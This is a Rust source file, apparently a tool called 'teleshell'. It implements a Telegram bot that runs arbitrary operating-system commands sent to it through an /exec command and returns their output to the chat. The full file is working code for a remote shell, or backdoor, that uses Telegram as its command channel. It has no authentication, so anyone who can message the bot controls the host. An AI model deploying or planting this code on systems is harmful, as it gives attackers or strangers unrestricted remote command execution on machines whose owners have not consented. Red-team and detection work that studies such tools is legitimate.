use teloxide::{prelude::*, utils::command::BotCommands};
use teloxide::utils::command::ParseError;

#[tokio::main]
async fn main() {
    log::info!("Starting teleshell...");

    let bot = Bot::new("<your bot token>");

    Command::repl(bot, answer).await;
}

#[derive(BotCommands, Clone)]
#[command(rename_rule = "lowercase", description = "These commands are supported:")]
enum Command {
    #[command(description = "display this text.")]
    Help,
    #[command(description = "executes an OS command.", parse_with = command_parser)]
    Exec {
        command: String,
        arguments: Vec<String>
    },
}

fn command_parser(input: String) -> Result<(String, Vec<String>), ParseError> {
    let mut args = input.split_whitespace();

    if let Some(command) = args.next() {
        let args: Vec<String> = args.map(String::from).collect();

        Ok((String::from(command), args))
    } else {
        Err(ParseError::IncorrectFormat("incorrect command format".into()))
    }
}

async fn answer(bot: Bot, msg: Message, cmd: Command) -> ResponseResult<()> {
    match cmd {
        Command::Help => bot.send_message(msg.chat.id, Command::descriptions().to_string()).await?,
        Command::Exec {command, arguments} => {
            let result = std::process::Command::new(command)
                .args(arguments)
                .output();

            match result {
                Ok(command) => {
                    if command.status.success() {
                        bot.send_message(
                            msg.chat.id,
                            format!(
                                "[+] command success\n{}",
                                String::from_utf8_lossy(&command.stdout)
                            ),
                        ).await?
                    } else {
                        bot.send_message(
                            msg.chat.id,
                            format!(
                                "[+] command failure\n{}",
                                String::from_utf8_lossy(&command.stderr)
                            ),
                        ).await?
                    }
                }
                Err(err) => {
                    bot.send_message(
                        msg.chat.id,
                        format!(
                            "[-] error executing command\n{}",
                            err.to_string()
                        )
                    ).await?
                }
            }
        }
    };

    Ok(())
}